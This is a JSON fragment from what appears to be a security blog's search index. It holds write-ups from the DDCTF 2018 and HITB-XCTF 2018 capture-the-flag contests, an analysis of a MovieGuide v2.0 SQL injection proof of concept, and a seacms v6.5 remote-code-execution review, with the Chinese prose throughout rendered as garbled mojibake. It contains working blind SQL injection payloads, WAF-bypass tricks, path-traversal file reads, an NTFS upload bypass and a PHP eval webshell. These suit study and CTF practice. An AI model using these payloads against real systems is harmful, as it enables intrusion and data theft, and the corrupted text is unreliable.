writeup","permalink":"http://blog.0kami.cn/2018/04/21/ctf/ddctf-2018-web-writeup/","text":"DDCTF 2018 2ÈÅìWEB Writeup WEB00 Êï∞ÊçÆÂ∫ìÁöÑÁßòÂØÜstep 1:index.php ÈúÄË¶Å‰ª•IP:116.85.43.88ËÆøÈóÆÔºåhttpÂ§¥Âä†ÂÖ• X-Forwarded-For: 116.85.43.88 ÁªïËøá step 2:ÁªïËøáÂêéÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊü•ËØ¢ÂäüËÉΩÔºåÁÆÄÂçïÊµãËØïÂêéÂèëÁé∞id,title,dateÊúâÂÆâÂÖ®Â§ÑÁêÜÔºå‰ΩÜÊòØË°®Âçï‰∏≠ËøòÈöêËóèÁùÄauthorÔºåÂπ∂‰∏îÊ≤°ÊúâÂÅö‰ªª‰ΩïÂ§ÑÁêÜ„ÄÇ‰ª•payloada%&#39; &amp;&amp; &#39;%&#39;=&#39;%„ÄÅa%&#39; &amp;&amp; &#39;%&#39;!=&#39;%Á°ÆÂÆöÊ≥®ÂÖ•Â≠òÂú®,ÊÉ≥ÁùÄÁî®unionÁõ¥Êé•ÊèêÂèñÂá∫Êù•ÔºåÂèëÁé∞ÂêéÂè∞ËøòÊúâWAFÔºåÊ≤°ÁªïËøáÂéªÔºå‰ΩÜÊòØÂØπ‰∫éÁõ≤Ê≥®ÔºåÊàêÂäüÊûÑÈÄ†Âá∫‰∫Üpayloada%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%,ÂèëÁîü5ÁßíÂª∂Ëøü„ÄÇÔºàÂêéÊù•ÊÉ≥ÊÉ≥ÂÖ∂ÂÆûÂèØ‰ª•Áî®boolÂûãÁõ≤Ê≥®ÊèêÂèñÊï∞ÊçÆÔºâ step 3:Á°ÆËÆ§‰∫ÜauthorÂ≠óÊÆµÂèØ‰ª•Ê≥®ÂÖ•Ôºå‰ΩÜÊòØËøôÈÅìÈ¢òËøòÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÂ∞±ÊòØsha1Ê†°È™åÔºåË¶ÅÊÉ≥ÂÜôËÑöÊú¨ÔºåÂøÖÈ°ªÂÖàËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇÁ†îÁ©∂‰∫Ü‰∏Ä‰∏ãmain.jsÔºåÂèëÁé∞‰ª•Á±ª‰ººid=title=date=author=time=ÁöÑÂ≠óÁ¨¶‰∏≤sha1Â§ÑÁêÜÂêéÂêéÂè∞Ê†°È™å step 4:ÂÜôËÑöÊú¨Ôºå‰∏ªË¶ÅÂåÖÊã¨sha1Ê†°È™åÂíåÊó∂Èó¥Áõ≤Ê≥®ÔºåË¥¥‰∏Ä‰∏ãpayload 123456789101112payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# Ëé∑ÂèñÂà∞Â∫ìÂêç ddctfpayload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;# Ëé∑ÂèñÂà∞Ë°®Âêç message, ctf_key4payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# Ëé∑ÂèñÂà∞ÂàóÂêç ctf_key4:secvalue; message: id,title,author,time,statuspayload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;# Ëé∑ÂèñÂà∞flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125; WEB01 ‰∏ìÂ±ûÈìæÊé•step 1:Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÔºåÈ¢òÁõÆÂè™Ë∑üÈìæÊé•IPÊúâÂÖ≥ÔºåÊâÄ‰ª•‰∏ªË¶ÅÊúâ1234http://116.85.48.102:5050/welcom/uuid #‰∏ªÈ°µ Ê≥®ÊÑèÂà∞‰∏äÈù¢Êúâemail:3814166715717836733@didichuxing.comhttp://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # Áªô‰∫ÜÊèêÁ§∫ÔºåÂè™ËÉΩ‰∏ãËΩΩ.class,.ks,.ico,.xmlÊñá‰ª∂http://116.85.48.102:5050/news/topFiveNews # Ê≤°Áî®http://116.85.48.102:5050//flag/testflag/yourflag #ËÆøÈóÆÊä•ÈîôÔºå‰ΩÜÊòØÊö¥Èú≤‰∫ÜÊéßÂà∂Âô®Ë∑ØÂæÑcom.didichuxing.ctf.controller.user.FlagController.java step 2:ÈÇ£‰πàÊé•‰∏ãÊù•Â∞±ÊòØÁåúË∑ØÂæÑ‰∫ÜÔºåÂú®github‰∏äÊâæ‰∫Ü‰∏™springmvc+mybatisÁöÑÈ°πÁõÆ,ÁªèËøáÊµãËØïÔºåÂèëÁé∞‰∏Ä‰∏ãÂá†‰∏™Êñá‰ª∂ ../../WEB-INF/web.xml # ÂæóÂà∞WEB-INF/applicationContext.xmlÔºåcom.didichuxing.ctf.listener.InitListener ../../WEB-INF/applicationContext.xml # ÂæóÂà∞classpath:mybatis/config.xml ../../WEB-INF/classes/mybatis/config.xml # ÂæóÂà∞mapper/FlagMapper.xml ../../WEB-INF/classes/mapper/FlagMapper.xml # sqlËØ≠Âè• ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class ../../WEB-INF/classes/sdl.ks # ÂØÜÈí•Êñá‰ª∂ ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class step 3:Êää‰∏äËø∞ÁöÑclassÊñá‰ª∂Âú®Á∫øÂèçÁºñËØëÂà∞javaÔºåÈòÖËØªÂêéÂèëÁé∞flagController.java 12345678@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;) public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123; Flag flag = flagService.getFlagByEmail(email); return &quot;Encrypted flag : &quot; + flag.getFlag(); &#125; ‰ª•Áî®Êà∑ÁöÑÈÇÆÁÆ±Êù•Ëé∑ÂèñÂä†ÂØÜÁöÑflagÔºåÈÇÆÁÆ±Â∞±ÊòØÈ¶ñÈ°µ‰∏äÁöÑÈÇÆÁÆ±ÔºåÁÑ∂ÂêéÈÄöËøálistener.javaÂæóÂà∞ÂÖ∑‰ΩìÁöÑÂä†ÂØÜËøáÁ®ã 12345678910111213String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);byte[] data = cipher.doFinal(flag.getBytes());byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());Flag flago = new Flag();flago.setId(Integer.valueOf(id));flago.setFlag(byte2hex(data));flago.setEmail(byte2hex(e));flago.setOriginFlag(flag);flago.setUuid(uuid);flago.setOriginEmail(email); ÂèØ‰ª•ÁúãÂà∞EmailË¢´ËΩ¨Âåñ‰∏∫16ËøõÂà∂ÁöÑÂΩ¢ÂºèÔºåÊâÄ‰ª•ÈúÄË¶ÅÂÖàÂØπÈÇÆÁÆ±ÂÅöÂ§ÑÁêÜÔºåÁÆÄÂçïÁºñÂÜô‰ª£Á†ÅÔºàÂêéÈù¢Êîæ‰∏äÊù•ÔºâÔºåÂæóÂà∞8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27Ôºå‰ª•http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27ËØ∑Ê±ÇÂêéÂæóÂà∞Âä†ÂØÜÁöÑflag„ÄÇ step 4:Êé•‰∏ãÊù•Â∞±ÊòØÂÜô‰ª£Á†ÅËß£ÂØÜflag‰∫ÜÔºåÂõ†‰∏∫ÂØÜÈí•Êñá‰ª∂Âú®ÊâãÔºåÂè™ÈúÄÁºñÂÜôÁ®ãÂ∫èÂç≥ÂèØÔºåÂèÇËÄÉhttps://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qaÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøôÈáåÁî®‰∫ÜÁßÅÈí•Âä†ÂØÜÂÖ¨Èí•Ëß£ÂØÜ„ÄÇËß£ÂØÜÂêéÂæóÂà∞flag"},{"title":"„ÄêCTF„ÄëHITB-XCTF 2018 web writeup","permalink":"http://blog.0kami.cn/2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/","text":"upload ËÄÉÁÇπwindowsÂπ≥Âè∞ÁöÑ‰∏Ä‰∫õÁâπÊÄß windowsÂπ≥Âè∞ÁâπÊÄßwindows‰∏ãÊêúÁ¥¢Êñá‰ª∂Áî®Âà∞ÁöÑÊòØFindFirstFileÔºåËØ•ÂáΩÊï∞ÊâßË°åÊó∂Ôºå‰ºöÂ∞Ü&quot;&lt;&quot; =&gt; &quot;*&quot;„ÄÅ&quot;&gt;&quot; =&gt; &quot;?&quot;„ÄÅ&quot; =&gt; .ÔºåÊâÄ‰ª•Âú®Â∫îÁî®‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Ëøô‰∏™ÁâπÊÄß„ÄÇe.g. `?filename=a&gt; =&gt; a?` ÂåπÈÖçÂçï‰∏™Â≠óÁ¨¶ `?filename=a&lt; =&gt; a*` ÂåπÈÖçÂ§ö‰∏™Â≠óÁ¨¶ `?filename=a&quot; =&gt; a.` NTFS ADSÁâπÊÄß ‰∏ä‰º†ÁöÑÊñá‰ª∂Âêç Á≥ªÁªüÁªìÊûú test.php:a.jpg ÁîüÊàêtest.phpÔºå‰ΩÜÊòØÊó†ÂÜÖÂÆπ test.php::$DATA ÁîüÊàêtest.phpÔºåÊúâÂÜÖÂÆπ test.php::$INDEX_ALLOCATION ÁîüÊàêtest.phpÊñá‰ª∂Â§π test.php::$DATA.jpg ÁîüÊàê0.jpgÔºåÊúâÂÜÖÂÆπ test.php::$DATA\\test.jpg ÁîüÊàêaaa.jpgÔºåÊúâÂÜÖÂÆπ ËøáÁ®ã step 1:ÂäüËÉΩÁÇπ#Êñá‰ª∂‰∏ä‰º† #‰∏ä‰º†Êñá‰ª∂ÂÆΩÈ´ò =&gt; getshellÁéØÂ¢ÉÔºöIIS7.0 Windows Server 2008 Standard Edition Service Pack 2 step 2:Êñá‰ª∂‰∏ä‰º†ÂäüËÉΩÈªëÂêçÂçïphpÔºåÊñá‰ª∂ÂêçÂâçÁºÄÊó∂Èó¥Êà≥ÈáçÂÜôÔºå‰ΩÜÊà™Âèñ‰∏ä‰º†Êñá‰ª∂ÂêçÁöÑÊúÄÂêé‰∏Ä‰∏™ÂêéÁºÄ‰∏çÂèò„ÄÇÁÆÄÂçïÂà©Áî®ADSÁâπÊÄßÔºå‰∏ä‰º†test.php::$DATA step 3:‰∏ä‰º†‰∫ÜÊñá‰ª∂ÂêéÔºåÈúÄË¶ÅÊâæÂà∞Êñá‰ª∂ÁõÆÂΩï„ÄÇpic.phpËøîÂõû‰∫Ü‰∏ä‰º†Êñá‰ª∂ÂÆΩÂíåÈ´òÔºåÁåúÊµãÂÖ∂‰ΩøÁî®‰∫ÜgetimagesizeÔºåÊÉ≥Âà∞ÂâçÊÆµÊó∂Èó¥ÁöÑ‰∏ÄÁØáÂ∏ñÂ≠êÔºåÂÜô‰∏™ËÑöÊú¨Ë∑ëËØ•Â§çÊùÇÁõÆÂΩï 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2018/4/11import requestsstr=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;ret=&quot;&quot;for i in range(32): for c in str: t=ret+c url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot; r=requests.get(url) if &quot;width&quot; in r.content: ret+=c print ret break ÂæóÂà∞ÁõÆÂΩï87194f13726af7cee27ba2cfe97b60df step 4:Êúâ‰∫ÜÁõÆÂΩïÂ∞±ËÉΩËÆøÈóÆ‰∏ä‰º†ÁöÑ‰∏ÄÂè•ËØù&lt;?php eval($_POST[cmd]);?&gt;ÔºåÁ≥ªÁªüÁ¶ÅÁî®‰∫ÜÊâßË°åÁ≥ªÁªüÂëΩ‰ª§ÁöÑ‰∏Ä‰∫õÂáΩÊï∞Ôºå‰ΩÜÊòØËøôÈáåÂπ∂‰∏çÈúÄË¶ÅÊâßË°åÂëΩ‰ª§„ÄÇËøôÈáå‰∏çÊà™Âõæ‰∫Ücmd=var_dump(glob(&quot;../*&quot;));ÂæóÂà∞flag.phpÔºåËÆøÈóÆÂêéÂèëÁé∞ÈúÄË¶ÅËØªÂèñflag.phpÁöÑÂÜÖÂÆπcmd=echo readfile(&quot;../flag.php&quot;);ÂæóÂà∞flag ÊÄªÁªìËøôÊ¨°Â∞±ÂÅö‰∫Ü‰∏ÄÈÅìwebÔºåËøòÊúâÂæÖÊèêÈ´òÂíåÁßØÁ¥Ø:)"},{"title":"„ÄêCode Analysis„ÄëMovieGuide v2.0 SQLi","permalink":"http://blog.0kami.cn/2018/02/03/php/MovieGuide2SQLi/","text":"0x00Detail: Movie Guide v2.0 SQL Injection 0x01ËøôÊòØ‰∏Ä‰∏™ÊØîËæÉÁ≤óÁ≥ôÁöÑÂºÄÊ∫êcmsÔºåÊÄª‰ΩìÊù•ËØ¥Âπ∂Ê≤°ÊúâÂØπËæìÂÖ•ËæìÂá∫ÂÅöÂÆâÂÖ®Â§ÑÁêÜÔºå‰ªéPoCÂÖ•ÊâãÔºåÈÄâ‰∏Ä‰∏™ËøòÂéü‰∏Ä‰∏ãÊºèÊ¥ûÂΩ¢ÊàêËøáÁ®ã„ÄÇ PoCÔºöindex.php?md=[SQL]ÂÆö‰Ωç‰∏Ä‰∏ãmdÂèÇÊï∞layout.php‰∏∫ËØ•cmsÁöÑ‰∏ªË¶ÅÂÖ•Âè£Â§ÑÁêÜ,‰∏ãËø∞ÁöÑÂèòÈáèÂùáÊ≤°ÊúâÈÄöËøáÂÆâÂÖ®Â§ÑÁêÜÔºåÁõ¥Êé•SQLËØ≠Âè•Ôºå‰ªéËÄåÈÉΩÂèØ‰ª•Áî®‰∫éÊï∞ÊçÆÂ∫ìÊ≥®ÂÖ•„ÄÇ12345678//Get the passed variables.$mterm = filter_input(INPUT_POST, 'tterm');$cterm = filter_input(INPUT_POST, 'gterm');$lterm = filter_input(INPUT_GET, 'gterm');$yterm = filter_input(INPUT_GET, 'year');$md = filter_input(INPUT_GET, 'md');$actorname = filter_input(INPUT_GET, 'actor');$directorname = filter_input(INPUT_GET, 'director'); Áõ¥Êé•ÊãºÊé•ÂÖ•SQLËØ≠Âè•1$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;; ËøôÈáåÊØîËæÉÊúâÊÑèÊÄùÁöÑÊòØÂÆÉÁöÑPoCÔºå‰ª•ÂâçÊ≤°ÊúâËßÅËøáÁ±ª‰ººÁöÑ:bÔºåPoC‰∏≠‰ΩøÁî®‰∫Üexport_setÂáΩÊï∞ EXPORT_SET(bits,on,off[,separator[,number_of_bits]])Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of ‚àí1 is effectively the same as 64. ÂàÜËß£‰∏Ä‰∏ãPoC123456789101112131415/*!02222UNION*/( /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239, ( /*!02222Select*/ export_set(5,@a:=0, (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a export_set(5, export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name] ,/*!02222column_name*/,&apos;\\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\\n:columns_name] ) ,@a,2)//set @a split char ) ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239 )-- - ËøôÈáå‰∏ªË¶ÅÂà©Áî®ÁöÑÊòØexport_setÂáΩÊï∞ÁöÑnoÔºåoff‰ΩçÁΩÆÊù•dumpÊï∞ÊçÆ„ÄÇ È¶ñÂÖàÈÄöËøá@a:=0ÔºåÂÆö‰πâÂèòÈáèa‰∏∫0ÔºàÂèØËÉΩË∑ümysqlÁâàÊú¨ÊúâÂÖ≥Á≥ªÔºå5.7.x‰∏ãÁöÑmysqlÊó†Ê≥ïÁî®@:=0Êù•ÂÆö‰πâÔºâ ÊúÄÈáåÈù¢ÁöÑexport_setÔºåÂ∞Ütable_name dumpÂá∫Êù•ÔºàÁªìÊûú‰∏∫0&lt;li&gt;table_nameÔºâ Êé•‰∏ãÊù•ÁöÑ‰∏Ä‰∏™export_setÔºåÂ∞Ücolumns_name dumpÂá∫Êù•(ÁªìÊûú‰∏∫0&lt;li&gt;table_name\\n:columns_name) select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\\n:&#39;,2)Â∞Ü‰∏äËø∞ÁöÑÊï∞ÊçÆËµãÂÄºÁªôÂèòÈáèa ÊúÄÂêéÁî®ÊúÄÂêé‰∏Ä‰∏™export_setÔºåÁî®@aÂÅöÂàÜÈöîÁ¨¶ÔºåÂ∞ÜÊï∞ÊçÆdumpÂá∫Êù• 0x02 ÊÄªÁªìËØ•cmsÁöÑÊ≥®ÂÖ•ÊºèÊ¥ûÂæàÂ∏∏ËßÑÔºå‰∏ªË¶ÅÊòØÂ≠¶‰π†ÂàÜÊûê‰∫ÜËØ•PoCÔºåËÉΩÂú®Êú™Êù•Ê≥®ÂÖ•ÁªïËøáÁöÑÂú∞ÊñπÂ∫îÁî®„ÄÇ mysqlÁöÑËá™ÂÆö‰πâÂèòÈáè@ÁöÑÂ∫îÁî®ÔºåÂèØ‰ª•Âú®‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÊ∂àÈô§Á©∫Ê†ºÔºå‰ª•ÂèäÊ≠£Âàô\\bwhere\\bÁöÑÁªïËøá /!02222select*/Ëøô‰∏™ÊñπÊ≥ï‰πüÊòØÁªèÂ∏∏Âê¨ËØ¥Ôºå‰πüÂú®ËøôÈáåÁî®Âà∞‰∫ÜÔºå‰∏Ä‰∏™ÂæàÂ•ΩÁöÑ‰æãÂ≠ê„ÄÇ export_setÁöÑÂ∫îÁî®ÔºåÊØîËæÉÈáçË¶ÅÁöÑÂ∫îÁî®ÔºåÂú®Êüê‰∫õÊÉÖÂÜµ‰∏ãÂèØÁî®‰∫éÁªïËøá"},{"title":"„ÄêCode Review„Äëseacms v6.5 ÂâçÂè∞getshell","permalink":"http://blog.0kami.cn/2017/03/16/old-old-seacms-v6-5-getshell/","text":"Ê¶ÇËø∞ÂâçÊÆµÊó∂Èó¥ÊîæÂú®90sec‰∏äÁöÑ‰∏ÄÁØá‰ª£Á†ÅÂÆ°ËÆ°ÔºåÊî∂Êãæ‰∏Ä‰∏ãÊîæÂà∞Ëá™Â∑±ÂçöÂÆ¢‰∏ä ÂàÜÊûêcmsÁâàÊú¨Ôºö6.45Áõ¥Êé•‰∏ä‰ª£Á†Å123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function parseIf($content)&#123; if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;); $labelRule2=&quot;&#123;elseif&quot;; $labelRule3=&quot;&#123;else&#125;&quot;; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; echo &quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;; eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;&quot;); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(&quot;if($strIf)&#123;\\$resultStr=\\&quot;$elseIfArraystr0\\&quot;;&#125;&quot;); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen\\&quot;;&#125;&quot;); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;&quot;); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0); @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen0\\&quot;;\\$elseIfFlag=true;&#125;&quot;); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; ‰∏äÈù¢‰∏ªË¶ÅÈÄªËæë‰∏∫Ëß£ÊûêhtmlÊñá‰ª∂‰∏≠ÁöÑ{if:}{end if}Ê†áÁ≠æ‰ª£Á†ÅÔºåÂèØ‰ª•ÁúãÂà∞Ê≤°ÊúâÂÅö‰ªª‰ΩïÂ§ÑÁêÜÂ∞±evalÔºåÈÇ£‰πàÊàë‰ª¨Êü•Êâæ‰∏Ä‰∏ãÂØπÂ∫îË∞ÉÁî®ÁöÑÂú∞Êñπ‰ºö‰∏ç‰ºöÊúâÊºèÊ¥û„ÄÇ‰∏ªË¶ÅÂÖ≥Ê≥®ÂâçÂè∞ÔºåÊâæÂà∞‰∏ÄÂ§ÑËß£ÊûêÊêúÁ¥¢ÁªìÊûúÁöÑÈ°µÈù¢Ôºàsearch.phpÔºâÔºå‰ª£Á†ÅÊØîËæÉÂ§öÔºå‰∏ÄÁÇπ‰∏ÄÁÇπÊù•Áúã„ÄÇÊâæÂà∞Ë∞ÉÁî®ÁöÑ‰ΩçÁΩÆline 212$content=$mainClassObj-&gt;parseIf($content);ÂæÄ‰∏äÁúãÔºåÂèëÁé∞‰ªñÁöÑÈÄªËæëÊòØÂÖàËß£ÊûêÂÖ∂‰ªñÁ±ªÂûãÁöÑÊ†áÁ≠æÔºåÊØîÂ¶Ç{searchpage:page}ÈÇ£‰πàÊé•‰∏ãÊù•ÁöÑÊÄùË∑ØÔºå‰∏ªË¶ÅÊòØ2ÁÇπÔºåÊü•ÊâæÂØπÂ∫îifÊ†áÁ≠æÂèØÊéßÁöÑ‰ΩçÁΩÆÔºåÂè¶‰∏ÄÁßçÂ∞±ÊòØÊü•ÊâæÂÖ∂‰ªñÊ†áÁ≠æÁöÑÂèØÊéßÂÜÖÂÆπÔºåÂÜôÂÖ•ifÊ†áÁ≠æÊàëÊâæÂà∞‰∏ÄÂ§ÑÂÖ∂‰ªñÊ†áÁ≠æÂèØÊéß‰∏îÊ≤°ÊúâÂÅö‰ªª‰ΩïÂ§ÑÁêÜÁöÑ‰ΩçÁΩÆÔºåÁõ¥Êé•ÂÜôÂÖ•ifÊ†áÁ≠æËØ≠Âè•Âç≥ÂèØÈÄ†Êàê‰ªªÊÑè‰ª£Á†ÅÊâßË°å1234567891011121314function echoSearchPage()&#123; global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost; $order = !empty($order)?$order:time;.........$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content); $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content); $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content); $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);......... orderÂèòÈáèÂèØÊéßÂπ∂‰∏îÂú®Ë∞ÉÁî®parseIfÂáΩÊï∞ÂâçÂÖàËß£ÊûêÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáorderÂÜôÂÖ•ifÊ†áÁ≠æ„ÄÇÊü•Áúã‰∏Ä‰∏ãÂÖ∑‰Ωìhtml‰ª£Á†Å1234567&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;ÊúÄÊñ∞‰∏äÊò†&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;ÊúÄËøëÁÉ≠Êí≠&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;ËØÑÂàÜÊúÄÈ´ò&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; 